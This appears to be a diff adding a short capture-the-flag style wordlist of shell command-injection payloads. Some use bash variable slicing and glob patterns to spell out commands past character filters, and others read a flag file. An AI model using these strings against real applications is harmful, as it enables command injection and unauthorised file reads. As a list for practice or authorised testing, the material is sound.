@@ -1,0 +1,9 @@
+${PATH:0:1}
+$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})
+$?
+$$
+$(/?/?/???)
+ls
+/bin/ls
+cat flag.txt
+/bin/cat flag*
